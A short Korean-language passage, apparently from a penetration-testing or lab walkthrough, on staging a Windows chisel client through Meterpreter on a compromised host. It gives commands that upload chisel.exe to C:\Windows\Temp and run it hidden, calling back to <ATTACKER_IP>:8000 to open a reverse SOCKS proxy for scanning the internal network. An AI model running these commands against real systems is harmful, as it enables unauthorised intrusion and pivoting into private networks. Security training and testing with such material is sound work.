...
### Meterpreter로 Windows x64 client 반입과 실행

릴리스의 `windows_amd64` 압축을 풀어 얻은 `chisel.exe`를 전송한다. 압축 파일 자체나 Linux 실행 파일을 올리지 않는다.

```text
meterpreter > upload <KALI_WINDOWS_AMD64_CHISEL> C:\\Windows\\Temp\\chisel.exe
meterpreter > execute -f C:\\Windows\\Temp\\chisel.exe -a "client <ATTACKER_IP>:8000 R:1083:socks" -H
```

공격 호스트의 server 로그에 client 연결이 표시되고 `127.0.0.1:1083` listener가 생겨야 client 실행 성공으로 판단한다.

### 생성된 SOCKS proxy로 내부망 스캔
